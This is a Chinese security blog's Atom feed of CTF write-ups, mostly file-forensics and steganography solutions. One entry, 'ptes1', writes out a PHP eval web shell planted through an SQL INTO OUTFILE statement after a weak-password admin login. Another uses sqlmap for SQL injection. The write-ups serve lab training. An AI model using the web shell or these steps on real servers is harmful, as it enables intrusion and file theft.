<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>BitSec&#39;s Blog</title>
  
  <subtitle>天道酬勤，厚德载物</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-11-23T07:37:05.089Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>BitSec</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ptes1</title>
    <link href="http://yoursite.com/2019/11/23/ptes1/"/>
    <id>http://yoursite.com/2019/11/23/ptes1/</id>
    <published>2019-11-23T02:36:38.000Z</published>
    <updated>2019-11-23T07:37:05.089Z</updated>
    
    <content type="html"><![CDATA[<p>题目给出一个网站，内容太多，无处下手。</p><ol><li>查看首页源代码，发现后台链接。</li></ol><p><img src="./ptes01.PNG" alt="ptes01"></p><ol start="2"><li>仔细观察页面最下面，发现后台链接。</li></ol><p><img src="./ptes02.PNG" alt="ptes02"></p><ol start="3"><li>使用御剑扫描发现后台链接。</li></ol><p><img src="./ptes03.PNG" alt="ptes03"></p><ol start="4"><li>访问robots.txt文件，发现后台链接。</li></ol><p><img src="./ptes06.PNG" alt="ptes04"></p><p>访问后台链接页面，发现是EmpireCMS 7.0。</p><p><img src="./ptes04.PNG" alt="ptes05"></p><p>首先尝试弱口令test/123456顺利进入后台。</p><p>浏览页面内容，当点击数据更新处时发现第一个flag。</p><p><img src="./ptes05.PNG" alt="ptes06"></p><p>点击版本更新，发现有《帝国网站管理系统》教程下载，</p><p><img src="./ptes07.PNG" alt="ptes07"></p><p>点击链接中的下载链接下载：</p><p><img src="./ptes08.PNG" alt="ptes08"></p><p>然后查看，发现有执行SQL语句功能。</p><p><img src="./ptes09.PNG" alt="ptes09"></p><p>按照里面的步骤执行SQL语句“select ‘<?php @eval($_POST[cmd])?>‘INTO OUTFILE ‘D:/www/<a href="http://www.php&#39;”。" target="_blank" rel="noopener">www.php&#39;”。</a><br>实际上本题木马已经被其他攻击者上传了。直接使用即可。</p><p><img src="./ptes10.PNG" alt="ptes10"></p><p>此时在服务器生成相应的含有一句话木马对php页面。</p><p><img src="./ptes11.PNG" alt="ptes11"></p><p>使用中国菜刀或者中国蚁剑连接该一句话木马，即可访问系统文件。</p><p><img src="./ptes12.PNG" alt="ptes12"></p><p>浏览C盘根目录下的user.txt文件，得到第二个flag：</p><p><img src="./ptes13.PNG" alt="ptes13"></p><p>同样，浏览C盘根目录下的admin.txt文件，得到第三个flag：</p><p><img src="./ptes14.PNG" alt="ptes14"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目给出一个网站，内容太多，无处下手。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;查看首页源代码，发现后台链接。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;./ptes01.PNG&quot; alt=&quot;ptes01&quot;&gt;&lt;/p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;仔细观察页面最下面，发现后
      
    
    </summary>
    
    
      <category term="PTES" scheme="http://yoursite.com/categories/PTES/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>glance-50</title>
    <link href="http://yoursite.com/2019/11/20/glance-50/"/>
    <id>http://yoursite.com/2019/11/20/glance-50/</id>
    <published>2019-11-20T11:31:42.000Z</published>
    <updated>2019-11-20T11:40:30.851Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-glance-50"><a href="#src-攻防世界-glance-50" class="headerlink" title="[src = 攻防世界] glance-50"></a>[src = 攻防世界] glance-50</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>下载得到一张gif 图片，先用工具分离。</p><ol><li><p>使用gif逐帧提取工具“gif分离器”分离得到200张图片，都是窄条；</p></li><li><p>KALI下的convert工具分离得到200张窄条图片：</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert glance.gif flag.png</span><br></pre></td></tr></table></figure><p>看来需要进行拼接，都是窄条，考虑横向拼接，使用KALI下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">montage flag*.png -tile x1 -geometry +0+0 flag.png</span><br></pre></td></tr></table></figure><p>其中：<br>-tile是拼接时每行和每列的图片数，这里用x1，就是只一行</p><p>-geometry是首选每个图和边框尺寸，我们边框为0，图照原始尺寸即可</p><p>拼接完成得到flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;src-攻防世界-glance-50&quot;&gt;&lt;a href=&quot;#src-攻防世界-glance-50&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] glance-50&quot;&gt;&lt;/a&gt;[src = 攻防世界] glance-50&lt;/h2&gt;&lt;
      
    
    </summary>
    
    
      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
    
    
      <category term="信息隐藏" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F/"/>
    
  </entry>
  
  <entry>
    <title>embarss &amp; Cephalopod</title>
    <link href="http://yoursite.com/2019/11/20/embarss/"/>
    <id>http://yoursite.com/2019/11/20/embarss/</id>
    <published>2019-11-20T11:05:47.000Z</published>
    <updated>2019-11-20T12:42:29.686Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-embarrass-amp-Cephalopod"><a href="#src-攻防世界-embarrass-amp-Cephalopod" class="headerlink" title="[src = 攻防世界] embarrass &amp; Cephalopod"></a>[src = 攻防世界] embarrass &amp; Cephalopod</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><h3 id="embarrass"><a href="#embarrass" class="headerlink" title="embarrass"></a>embarrass</h3><p>解压得到misc_02.pcapng。</p><ol><li><p>思路1：用wireshark打开，追踪TCP流，发现流数量很多，一直翻到第35个流，发现这个流是最大的，包含了8059个分组，可疑。将流保存为文本文件，然后使用查找功能，查找flag字符串，得到flag。</p></li><li><p>思路2：直接拿到linux下，对misc_02.pcapng进行字符串检索，得到flag。</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings misc_02.pcapng | grep flag</span><br></pre></td></tr></table></figure><p>其实还有更为直接对第三种方法，直接使用wireshark的字符串搜索功能，得到flag，如下图：</p><p><img src="./embrrass.PNG" alt="embarrass"></p><h3 id="Cephalopod"><a href="#Cephalopod" class="headerlink" title="Cephalopod"></a>Cephalopod</h3><p>同样得到pcapng文件。</p><ol><li><p>思路1：用wireshark打开，追踪TCP流，在第1流中发现flag.png.</p></li><li><p>思路2：直接拿到linux下，对misc_02.pcapng进行字符串检索，发现flag.png</p></li></ol><p>下一步找到flag.png图片。</p><ol><li><p>通过追踪流，然后利用十六进制编辑器保存数据得到图片，包含flag</p></li><li><p>使用tcpxtract 直接提取其中的图片，读取包含的flag。</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads<span class="comment"># tcpxtract -f 66b7f39d97364ca5a2f928a4e61b46ee.pcap</span></span><br></pre></td></tr></table></figure><p>如果没有安装，可以通过apt install tcpxtract安装即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;src-攻防世界-embarrass-amp-Cephalopod&quot;&gt;&lt;a href=&quot;#src-攻防世界-embarrass-amp-Cephalopod&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] embarrass &amp;am
      
    
    </summary>
    
    
      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
    
    
      <category term="信息隐藏" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F/"/>
    
      <category term="Wireshark" scheme="http://yoursite.com/tags/Wireshark/"/>
    
  </entry>
  
  <entry>
    <title>getthekeytxt</title>
    <link href="http://yoursite.com/2019/11/20/getthekeytxt/"/>
    <id>http://yoursite.com/2019/11/20/getthekeytxt/</id>
    <published>2019-11-20T03:20:11.000Z</published>
    <updated>2019-11-21T05:28:06.500Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-Get-the-key-txt"><a href="#src-攻防世界-Get-the-key-txt" class="headerlink" title="[src = 攻防世界] Get-the-key.txt"></a>[src = 攻防世界] Get-the-key.txt</h2><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>下载一个压缩包，解压得到forensic100。在KALI里面用file命令查看发现是一个文件系统。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file forensic100</span></span><br><span class="line">forensic100: Linux rev 1.0 ext2 filesystem data, UUID=0b92a753-7ec9-4b20-8c0b-79c1fa140869</span><br></pre></td></tr></table></figure><p>然后用strings命令发现大量类似flag的字符串。一个个试会累死的。也同时发现了很多txt文件，尝试分离这些文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads/output/zip<span class="comment"># binwalk forensic100</span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             Linux EXT filesystem, rev 1.0, ext2 filesystem data, UUID=0b92a753-7ec9-4b20-8c0b-79c1fa14fa14</span><br><span class="line">1049600       0x100400        gzip compressed data, has original file name: <span class="string">"key.txt"</span>, from Unix, last modified: 2014-10-01 06:00:52</span><br><span class="line">1050624       0x100800        gzip compressed data, has original file name: <span class="string">"key1.txt"</span>, from Unix, last modified: 2014-10-01 05:59:41</span><br><span class="line">1051648       0x100C00        gzip compressed data, has original file name: <span class="string">"key10.txt"</span>, from Unix, last modified: 2014-10-01 05:59:41</span><br><span class="line">1052672       0x101000        gzip compressed data, has original file name: <span class="string">"key100.txt"</span>, from Unix, last modified: 2014-10-01 05:59:41</span><br><span class="line">1053696       0x101400        gzip compressed data, has original file name: <span class="string">"key101.txt"</span>, from Unix, last modified: 2014-10-01 05:59:41</span><br><span class="line">1054720       0x101800        gzip compressed data, has original file name: <span class="string">"key102.txt"</span>, from Unix, last modified: 2014-10-01 05:59:41</span><br><span class="line">1055744       0x101C00        gzip compressed data, has original file name: <span class="string">"key103.txt"</span>, from Unix, last modified: 2014-10-01 05:59:41</span><br></pre></td></tr></table></figure><p>发现了大量分离的key文件,每一个里面都有大量flag。<br>根据题目提示，我们选择key.txt中的第一个flag提交成功。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;src-攻防世界-Get-the-key-txt&quot;&gt;&lt;a href=&quot;#src-攻防世界-Get-the-key-txt&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] Get-the-key.txt&quot;&gt;&lt;/a&gt;[src = 攻防世
      
    
    </summary>
    
    
      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
    
    
      <category term="信息隐藏" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F/"/>
    
  </entry>
  
  <entry>
    <title>crypto-info</title>
    <link href="http://yoursite.com/2019/11/20/crypto-info/"/>
    <id>http://yoursite.com/2019/11/20/crypto-info/</id>
    <published>2019-11-20T02:54:58.000Z</published>
    <updated>2019-11-20T03:00:43.821Z</updated>
    
    <content type="html"><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>密码学在线解码网站收集<br> <a id="more"></a><br><a href="https://www.qqxiuzi.cn" target="_blank" rel="noopener">https://www.qqxiuzi.cn</a><br><a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a><br><a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">https://www.guballa.de/vigenere-solver</a>  vigenere解密</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h2&gt;&lt;p&gt;密码学在线解码网站收集&lt;br&gt;
    
    </summary>
    
    
      <category term="CRYPTO" scheme="http://yoursite.com/categories/CRYPTO/"/>
    
    
      <category term="密码学在线解码网站收集" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9C%A8%E7%BA%BF%E8%A7%A3%E7%A0%81%E7%BD%91%E7%AB%99%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>gongfu</title>
    <link href="http://yoursite.com/2019/11/20/gongfu/"/>
    <id>http://yoursite.com/2019/11/20/gongfu/</id>
    <published>2019-11-20T00:54:48.000Z</published>
    <updated>2019-11-20T02:54:26.945Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-掀桌子"><a href="#src-攻防世界-掀桌子" class="headerlink" title="[src = 攻防世界] 掀桌子"></a>[src = 攻防世界] 掀桌子</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>菜狗决定用菜刀和菜鸡决一死战<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>下载文件下来是一个以pcapng结尾的文件看属性有二点几m可见东西不小啊<br>先放进foremost中分离出来一个压缩包但是他有密码，所以接下来就是我们找密码的时候。</p><p>用wireshark打开pcapng，追踪tcp流，发现在第7个流里面有一个6666.jpg文件。如图：</p><p><img src="./gongfu1.PNG" alt="gongfu"></p><p>再查看前面的一大段16进制，发现开头和结束恰好是jpg文件对开头（FF D8）和结尾（FF D9）。</p><p><img src="./gongfu2.PNG" alt="gongfu"></p><p><img src="./gongfu3.PNG" alt="gongfu"></p><p>请头尾之间的部分复制出来，用winhex或者HxD等16进制编辑器新建一个16进制空文件，将复制的内容复制进去，然后保存为jpg文件，得到一张图片。其中包含了压缩包密码，解压压缩包得到flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-攻防世界-掀桌子&quot;&gt;&lt;a href=&quot;#src-攻防世界-掀桌子&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] 掀桌子&quot;&gt;&lt;/a&gt;[src = 攻防世界] 掀桌子&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;菜狗决定用菜刀和菜鸡决一死战&lt;br&gt;
    
    </summary>
    
    
      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
    
    
      <category term="信息隐藏" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F/"/>
    
      <category term="Wireshark" scheme="http://yoursite.com/tags/Wireshark/"/>
    
  </entry>
  
  <entry>
    <title>xianzhuozi</title>
    <link href="http://yoursite.com/2019/11/20/xianzhuozi/"/>
    <id>http://yoursite.com/2019/11/20/xianzhuozi/</id>
    <published>2019-11-20T00:40:10.000Z</published>
    <updated>2019-11-20T00:44:54.997Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-掀桌子"><a href="#src-攻防世界-掀桌子" class="headerlink" title="[src = 攻防世界] 掀桌子"></a>[src = 攻防世界] 掀桌子</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子(╯°□°）╯︵ ┻━┻<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>试着将16进制字符转为字符串，发现不能直接转化，试着将ascii码值减去128再转化，得到flag. </p><p>示例脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="string">"c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(string), <span class="number">2</span>):</span><br><span class="line">    s = <span class="string">"0x"</span> + string[i] + string[i+<span class="number">1</span>]</span><br><span class="line">    flag += chr(int(s, <span class="number">16</span>) - <span class="number">128</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-攻防世界-掀桌子&quot;&gt;&lt;a href=&quot;#src-攻防世界-掀桌子&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] 掀桌子&quot;&gt;&lt;/a&gt;[src = 攻防世界] 掀桌子&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子(╯°□°）╯︵ ┻━┻&lt;br&gt;
    
    </summary>
    
    
      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
    
    
      <category term="编码" scheme="http://yoursite.com/tags/%E7%BC%96%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>pdf</title>
    <link href="http://yoursite.com/2019/11/18/pdf/"/>
    <id>http://yoursite.com/2019/11/18/pdf/</id>
    <published>2019-11-18T12:53:05.000Z</published>
    <updated>2019-11-18T13:01:40.170Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-pdf"><a href="#src-攻防世界-pdf" class="headerlink" title="[src = 攻防世界] pdf"></a>[src = 攻防世界] pdf</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>菜猫给了菜狗一张图，说图下面什么都没有<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>打开PDF里面有一张图片，猜测flag被图片遮挡住了，怎么办呐？</p><ol><li><p>将pdf转为word，可以用在线工具，比如：<a href="https://app.xunjiepdf.com/pdf2word" target="_blank" rel="noopener">https://app.xunjiepdf.com/pdf2word</a></p></li><li><p>用pdf转word编辑器，不过很多都收费</p></li><li><p>用linux自带工具：pdftotext，然后检索flag：</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 66.txt | grep flag</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-攻防世界-pdf&quot;&gt;&lt;a href=&quot;#src-攻防世界-pdf&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] pdf&quot;&gt;&lt;/a&gt;[src = 攻防世界] pdf&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;菜猫给了菜狗一张图，说图下面什么都没有&lt;br&gt;
    
    </summary>
    
    
      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
    
    
      <category term="信息隐藏" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F/"/>
    
  </entry>
  
  <entry>
    <title>giveyouflag</title>
    <link href="http://yoursite.com/2019/11/18/giveyouflag/"/>
    <id>http://yoursite.com/2019/11/18/giveyouflag/</id>
    <published>2019-11-18T12:14:46.000Z</published>
    <updated>2019-11-21T02:16:01.962Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-give-you-flag"><a href="#src-攻防世界-give-you-flag" class="headerlink" title="[src = 攻防世界] give_you_flag"></a>[src = 攻防世界] give_you_flag</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><ol><li><p>打开图片，发现似乎有个二维码。通过工具（gif分离器）将各帧分离。得到52张图片，其中第49张包含一个二维码，但是缺少了3个定位符。手动添加，扫码即可。</p></li><li><p>使用KALI的命令进行分离，命令格式如下：</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert ggg.gif hh.jpg</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-攻防世界-give-you-flag&quot;&gt;&lt;a href=&quot;#src-攻防世界-give-you-flag&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] give_you_flag&quot;&gt;&lt;/a&gt;[src = 攻防世界] give_you_flag&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包&lt;br&gt;
    
    </summary>
    
    
      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
    
    
      <category term="信息隐藏" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F/"/>
    
  </entry>
  
  <entry>
    <title>ext3</title>
    <link href="http://yoursite.com/2019/11/18/ext3/"/>
    <id>http://yoursite.com/2019/11/18/ext3/</id>
    <published>2019-11-18T12:06:28.000Z</published>
    <updated>2019-11-21T05:44:52.049Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-ext3"><a href="#src-攻防世界-ext3" class="headerlink" title="[src = 攻防世界] ext3"></a>[src = 攻防世界] ext3</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>今天是菜狗的生日，他收到了一个linux系统光盘<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>将下载附件放到linux系统查看file格式，如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads<span class="comment"># file 630a886233764ec2a63f305f318c8baa </span></span><br><span class="line">630a886233764ec2a63f305f318c8baa: Linux rev 1.0 ext3 filesystem data, UUID=cf6d7bff-c377-403f-84ae-956ce3c99aaa</span><br></pre></td></tr></table></figure><p>再strings查看一下有没有flag这样的字符串：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads<span class="comment"># strings 630a886233764ec2a63f305f318c8baa |grep flag</span></span><br><span class="line">.flag.txt.swp</span><br><span class="line">flag.txtt.swx</span><br><span class="line">~root/Desktop/file/O7avZhikgKgbF/flag.txt</span><br><span class="line">.flag.txt.swp</span><br><span class="line">flag.txtt.swx</span><br><span class="line">.flag.txt.swp</span><br><span class="line">flag.txtt.swx</span><br></pre></td></tr></table></figure><p>flag应该在flag.txt中。</p><ol><li>挂载光盘：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads<span class="comment"># mount 630a886233764ec2a63f305f318c8baa /mnt</span></span><br><span class="line">root@kali:~/Downloads<span class="comment"># cd /mnt</span></span><br><span class="line">root@kali:/mnt<span class="comment"># ls</span></span><br><span class="line">02CdWGSxGPX.bin  0Xs    4A           8HhWfV9nK1  gtj        i             KxEQM           LvuGM       n              OOoOs      Q          rhZE1LZ6g   SPaK8l2sYN</span><br><span class="line">0GY1l            1      6JR3         8nwg        h          imgLDPt4BY    LG6F            lWIRfzP     NgzQPW         orcA       qkCN8      Ruc9        SrZznhSAj</span><br><span class="line">0h3a5            2X     6wUaZE1vbsW  8RxQG4bvd   H          ix1EMRHRpIc2  Lh              m           Nv             oSx2p      QmUY1d     RZTOGd      t</span><br><span class="line">0l               3      7H7geLlS5    FinD        H2Zj8FNbu  j6uLMX        LlC6Z0zrgy.bin  m9V0lIaElz  o              OT         QQY3sF63w  scripts     T</span><br><span class="line">0qsd             3J     8A2MFawD4    fm          hdi7       jE            LO0J8           MiU         O7avZhikgKgbF  poiuy7Xdb  r          sdb.cramfs  TFGVOSwYd.txt</span><br><span class="line">0wDq5            44aAm  8DQFirm0D    g           hYuPvID    jj            lost+found      Mnuc        o8             px6u       Raf3SYj    sn</span><br><span class="line">root@kali:/mnt<span class="comment"># cd O7avZhikgKgbF/</span></span><br><span class="line">root@kali:/mnt/O7avZhikgKgbF<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@kali:/mnt/O7avZhikgKgbF<span class="comment"># cat flag.txt</span></span><br><span class="line">ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=</span><br></pre></td></tr></table></figure><p>一串base64，解码即可得到flag。</p><ol start="2"><li>使用binwalk命令提取文件：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Downloads<span class="comment"># binwalk -e 630a886233764ec2a63f305f318c8baa</span></span><br></pre></td></tr></table></figure><p>找到flag.txt，发现base64编码，I解码得到flag。</p><ol start="3"><li>直接将文件后缀改为zip，解压，找到flag.txt，发现base64编码，I解码得到flag。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-攻防世界-ext3&quot;&gt;&lt;a href=&quot;#src-攻防世界-ext3&quot; class=&quot;headerlink&quot; title=&quot;[src = 攻防世界] ext3&quot;&gt;&lt;/a&gt;[src = 攻防世界] ext3&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;今天是菜狗的生日，他收到了一个linux系统光盘&lt;br&gt;
    
    </summary>
    
    
      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
    
    
      <category term="ext3" scheme="http://yoursite.com/tags/ext3/"/>
    
  </entry>
  
  <entry>
    <title>ics04</title>
    <link href="http://yoursite.com/2019/11/18/ics04/"/>
    <id>http://yoursite.com/2019/11/18/ics04/</id>
    <published>2019-11-18T11:21:08.000Z</published>
    <updated>2019-11-18T13:19:55.196Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-攻防世界-ics-04"><a href="#src-攻防世界-ics-04" class="headerlink" title="[src = 攻防世界] ics-04"></a>[src = 攻防世界] ics-04</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>工控云管理系统新添加的登录和注册页面存在漏洞，请找出flag。<br> <a id="more"></a></p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>题目提示登录和注册页面存在漏洞，随便注册一个账号登录，提示“普通用户登录成功,没什么用”。那就看看存不存在SQL注入吧。</p><p>对注册页面和登录页面使用sqlmap进行测试，对于POST方法对测试可以按照如下方法进行，首先使用burp抓包，然后使用“copy to file”功能将请求保存，然后sqlmap -r 文件名即可。比如保存对文件为sq.txt，则使用的sqlmap命令为sqlmap -r sq.txt.</p><p>或者对于POST数据使用–data参数，比如POST数据为username=bitsec，则可以使用如下sqlmap命令：<br>sqlmap -u “***” –data=”username=bitsec”.</p><p>测试所有页面，发现找回密码处有注入,并得到user表里面对数据为：</p><p><img src="./ics041.PNG" alt="isc04"><br>但是无法爆破出来密码。</p><p>但是我们发现注册页面可以重新注册用户，且没有任何验证。所以我们重新注册该用户c3tlwDmIn23，并登录得到flag。</p>]]></content>
    
    <summary type="html">
    
